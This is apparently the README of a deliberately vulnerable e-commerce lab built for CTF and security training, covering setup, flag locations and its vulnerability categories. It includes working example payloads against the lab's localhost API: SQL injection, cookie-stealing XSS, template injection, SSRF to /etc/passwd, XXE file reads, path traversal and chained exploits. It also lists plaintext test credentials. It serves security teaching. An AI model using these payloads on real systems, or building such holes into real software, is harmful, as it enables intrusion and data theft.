# 🔒 Hackazon - Intentionally Vulnerable E-Commerce Application

> **⚠️ WARNING**: This application is **INTENTIONALLY VULNERABLE** and should **NEVER** be deployed in production or exposed to the internet. It is designed exclusively for security training, CTF competitions, and penetration testing education.

## 📋 Overview

**Hackazon** (formerly ShopSmart) is a full-stack e-commerce application built with deliberately insecure code patterns to teach web application security. It contains **20 vulnerability instances** across **10 major security categories**, making it an ideal platform for:

- 🎓 **Security Training**: Learn to identify and exploit real-world vulnerabilities
- 🏆 **CTF Competitions**: Capture-the-flag challenges with 15 unique flags
- 🔍 **Penetration Testing Practice**: Hone your offensive security skills
- 🛠️ **Security Tool Testing**: Validate security scanners and tools
- 📚 **Educational Demonstrations**: Teach secure coding practices

---

## 🎯 Vulnerability Categories

| # | Category | Instances | Difficulty |
|---|----------|-----------|------------|
| 1 | SQL Injection | 2 | ⭐⭐ Medium |
| 2 | Cross-Site Scripting (XSS) | 2 | ⭐⭐ Medium |
| 3 | Server-Side Template Injection | 2 | ⭐⭐⭐ Hard |
| 4 | Vulnerable Components | 2 | ⭐⭐ Medium |
| 5 | Insecure Direct Object References | 2 | ⭐ Easy |
| 6 | XML External Entity (XXE) | 2 | ⭐⭐⭐ Hard |
| 7 | Path Traversal | 2 | ⭐⭐ Medium |
| 8 | Sensitive Data Exposure | 2 | ⭐ Easy |
| 9 | Server-Side Request Forgery | 2 | ⭐⭐⭐ Hard |
| 10 | Open Redirect | 2 | ⭐ Easy |
| | **TOTAL** | **20** | |

---

## 🏗️ Technology Stack

### Frontend
- **Framework**: Next.js 15 (App Router)
- **UI**: React 18 + Tailwind CSS
- **Auth**: Better Auth
- **Theme**: Dark mode support with `next-themes`

### Backend
- **Runtime**: Node.js 20
- **Framework**: Express.js 4
- **Database**: PostgreSQL 12
- **ORM**: Prisma
- **Cache**: Redis 7
- **Sessions**: Redis-backed with `express-session`
- **Email**: Nodemailer

### Infrastructure
- **Reverse Proxy**: Nginx
- **Containerization**: Docker + Docker Compose
- **Process Manager**: PM2 (production)

---

## 🚀 Quick Start

### Prerequisites
- Docker & Docker Compose
- Node.js 20+ (for local development)
- Git

### 1. Clone the Repository
```bash
git clone <repo-url>
cd med-lab
```

### 2. Start All Services
```bash
# Start Docker services
docker-compose up -d

# Wait for services to initialize
sleep 10

# Seed database with test data and flags
docker exec shopsmart-api npm run prisma:seed
```

### 3. Verify Services
```bash
# Check health
curl http://localhost:4000/health

# View logs
docker-compose logs -f
```

### 4. Access the Application
- **Frontend**: http://localhost:3000
- **Backend API**: http://localhost:4000
- **Nginx Proxy**: http://localhost

### 5. Test Credentials
```
Admin:  admin@shopsmart.com / admin123
User 1: john@example.com / password123
User 2: jane@example.com / password123
```

---

## 🧪 Testing Vulnerabilities

### Automated Testing
Run the comprehensive test suite:
```bash
chmod +x test-all-vulnerabilities.sh
./test-all-vulnerabilities.sh
```

### Manual Testing
See **[COMPLETE_VULNERABILITY_TEST_GUIDE.md](./COMPLETE_VULNERABILITY_TEST_GUIDE.md)** for detailed exploitation steps.

### Quick Examples

#### SQL Injection
```bash
# Bypass category filter
curl "http://localhost:4000/api/v1/products/search?category=1%20OR%201=1"

# Extract admin secrets
curl "http://localhost:4000/api/v1/products/search?category=-1%20UNION%20SELECT%20id,%20key,%20value,%200,%20NULL,%200,%20now()%20FROM%20admin_secret--"
```

#### Cross-Site Scripting
```bash
# Stored XSS in reviews
curl -X POST http://localhost:4000/api/v1/reviews \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"productId":1,"rating":5,"text":"<svg/onload=alert(document.cookie)>"}'

# Reflected XSS
# Visit: http://localhost:3000/product/<svg/onload=alert(1)>
```

#### Server-Side Template Injection
```bash
# Invoice SSTI (restricted evaluator)
curl "http://localhost:4000/api/v1/invoice/1?note={{7*7}}"
curl -G "http://localhost:4000/api/v1/invoice/1" --data-urlencode "note={{ flag }}"
```

#### SSRF
```bash
# Access internal service
curl "http://localhost:4000/api/v1/proxy?url=http://internal-api:5000/secret"

# File protocol bypass (case-sensitive)
curl "http://localhost:4000/api/v1/proxy?url=File:///etc/passwd"
```

#### XXE
```bash
# Read file via XML entity
curl -X POST http://localhost:4000/api/v1/admin/import \
  -H "Content-Type: application/json" \
  -H "x-admin: true" \
  -d '{"xml":"<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///app/secrets/flag.txt\">]><products><product>&xxe;</product></products>"}'
```

---

## 🎌 Flag Locations

### Capture the Flag
Hackazon contains **15 unique flags** in the format `PCTFS{...}`:

| Flag Type | Location | Method |
|-----------|----------|--------|
| SQLi Search | `admin_secret` table | UNION injection |
| SQLi Order | Admin order `gift_note` | UNION injection |
| IDOR Order | Admin order `gift_note` | Direct access |
| IDOR Profile | Admin user `secretNote` | No auth check |
| XXE | `/app/secrets/flag.txt` | XML entity |
| Path Traversal | `/etc/app_secrets/flag.txt` | Directory traversal |
| Git Exposure | `fe/.git/config` | Nginx misconfiguration |
| SSTI Invoice | Restricted renderer `{{ flag }}` | Template injection |
| SSTI Email | `process.env.SSTI_EMAIL_FLAG` | Template injection |
| Debug Console | `debug_secrets.console_flag` | Weak PIN + eval |
| Pillow CVE | `leaked_memory.adjacent_memory_leak` | Format parameter |
| Config Leak | Hardcoded in response | Header bypass |
| SSRF | `http://internal-api:5000/secret` | Internal network access |
| Open Redirect (Login) | Hardcoded in response | Validation bypass |
| Open Redirect (Affiliate) | Hardcoded in response | URL encoding |

**Note**: Database flags use dynamic UUIDs generated during seeding.

---

## 📚 Documentation

- **[COMPLETE_VULNERABILITY_TEST_GUIDE.md](./COMPLETE_VULNERABILITY_TEST_GUIDE.md)** - Step-by-step testing instructions for all 20 vulnerabilities
- **[COMPLETE_IMPLEMENTATION_SUMMARY.md](./COMPLETE_IMPLEMENTATION_SUMMARY.md)** - Technical implementation details and code references
- **[SECURITY_TESTING_GUIDE.md](./SECURITY_TESTING_GUIDE.md)** - Original testing guide (legacy)

---

## 🛠️ Development

### Local Development (Without Docker)

#### Backend
```bash
cd be

# Install dependencies
npm install

# Set up environment
cp .env.example .env
# Edit .env with your database credentials

# Run migrations
npm run prisma:migrate

# Seed database
npm run prisma:seed

# Start dev server
npm run dev
```

#### Frontend
```bash
cd fe

# Install dependencies
npm install

# Start dev server
npm run dev
```

### Database Management
```bash
# Generate Prisma client
cd be && npm run prisma:generate

# Run migrations
npm run prisma:migrate

# Seed database
npm run prisma:seed

# Open Prisma Studio
npm run prisma:studio
```

### Docker Commands
```bash
# Start services
docker-compose up -d

# View logs
docker-compose logs -f [service-name]

# Stop services
docker-compose down

# Rebuild images
docker-compose build --no-cache

# Remove all data
docker-compose down -v
```

---

## 🔍 Project Structure

```
med-lab/
├── be/                                 # Backend API
│   ├── src/
│   │   ├── routes/                     # API routes (vulnerabilities)
│   │   │   ├── products.js             # SQLi (Search)
│   │   │   ├── orders.js               # SQLi + IDOR
│   │   │   ├── reviews.js              # XSS (Stored)
│   │   │   ├── users.js                # IDOR (Profile)
│   │   │   ├── invoice.js              # SSTI (restricted renderer)
│   │   │   ├── email.js                # SSTI (EJS)
│   │   │   ├── admin.js                # Vuln Components
│   │   │   ├── xml.js                  # XXE
│   │   │   ├── download.js             # Path Traversal + Open Redirect
│   │   │   ├── config.js               # Data Exposure
│   │   │   ├── proxy.js                # SSRF (Proxy)
│   │   │   └── webhooks.js             # SSRF (Webhook)
│   │   ├── lib/
│   │   │   └── db.js                   # Prisma client
│   │   └── index.js                    # Express app
│   ├── prisma/
│   │   ├── schema.prisma               # Database schema
│   │   └── seed.js                     # Seed data + flags
│   └── package.json
├── fe/                                 # Frontend (Next.js)
│   ├── app/
│   │   ├── product/[id]/page.jsx       # XSS (Stored + Reflected)
│   │   ├── search/page.jsx             # SQLi frontend
│   │   ├── login/page.jsx              # Authentication
│   │   └── ...                         # Other pages
│   ├── lib/
│   │   ├── auth.js                     # Better Auth config
│   │   └── auth-client.js              # Auth client
│   └── package.json
├── infra/
│   ├── docker/
│   │   ├── Dockerfile.api              # Backend container
│   │   └── Dockerfile.frontend         # Frontend container
│   ├── nginx/
│   │   └── default.conf                # Nginx config (Git exposure)
│   └── internal-api.js                 # SSRF target service
├── apps/api/secrets/flag.txt           # XXE flag
├── docker-compose.yml                  # Multi-service orchestration
├── test-all-vulnerabilities.sh         # Automated test suite
├── COMPLETE_VULNERABILITY_TEST_GUIDE.md
├── COMPLETE_IMPLEMENTATION_SUMMARY.md
└── README.md
```

---

## 🎓 Educational Use

### Recommended Learning Path

1. **Beginners**: Start with IDOR and Data Exposure (⭐)
2. **Intermediate**: Explore SQLi, XSS, and Path Traversal (⭐⭐)
3. **Advanced**: Tackle SSTI, XXE, and SSRF (⭐⭐⭐)
4. **Expert**: Chain multiple vulnerabilities for complex exploits

### Multi-Step Exploitation Chains

#### Chain 1: IDOR → SQLi
```bash
# 1. Use IDOR to access admin order
curl -b cookies.txt http://localhost:4000/api/v1/orders/1

# 2. Use SQLi in order lookup
curl -b cookies.txt "http://localhost:4000/api/v1/orders/1%20UNION%20SELECT%20*%20FROM%20admin_secret--"
```

#### Chain 2: Path Traversal → Source Code Analysis → Privilege Escalation
```bash
# 1. Read source code via path traversal
curl "http://localhost:4000/api/v1/download/invoice?file=....//....//app/src/routes/auth.js"

# 2. Find hardcoded credentials
# 3. Use credentials for admin access
```

#### Chain 3: SSRF → Internal Service Enumeration
```bash
# 1. Discover internal services
curl "http://localhost:4000/api/v1/proxy?url=http://internal-api:5000"

# 2. Access internal API
curl "http://localhost:4000/api/v1/proxy?url=http://internal-api:5000/secret"
```

---

## 🔐 Security Considerations

### ⚠️ WARNING

This application is **INTENTIONALLY VULNERABLE**. It contains:

- SQL Injection vulnerabilities
- Cross-Site Scripting (XSS)
- Remote Code Execution (RCE) opportunities
- Authentication bypasses
- Authorization failures
- Sensitive data exposure
- And many more security issues...

### Safe Usage Guidelines

✅ **DO**:
- Use in isolated, air-gapped networks
- Deploy in Docker containers
- Use for educational purposes only
- Practice responsible disclosure

❌ **DO NOT**:
- Deploy to production
- Expose to the public internet
- Use with real user data
- Connect to production databases

---

## 🤝 Contributing

This is an educational project. Contributions are welcome for:
- Additional vulnerability patterns
- Improved documentation
- Bug fixes (non-security issues)
- New exploitation techniques

Please maintain the intentionally vulnerable nature of the codebase.

---

## 📄 License

This project is for **educational purposes only**. Use at your own risk.

---

## 🙏 Acknowledgments

Built for security education and inspired by:
- OWASP Top 10
- PortSwigger Web Security Academy
- HackTheBox & TryHackMe
- Real-world CVEs and security research

---

## 📞 Support

For issues, questions, or feedback:
- Open an issue on GitHub
- Refer to documentation files
- Join security training communities

---

**Happy Learning! 🎓🔒**

Remember: The best defense is understanding the offense. Practice safely!
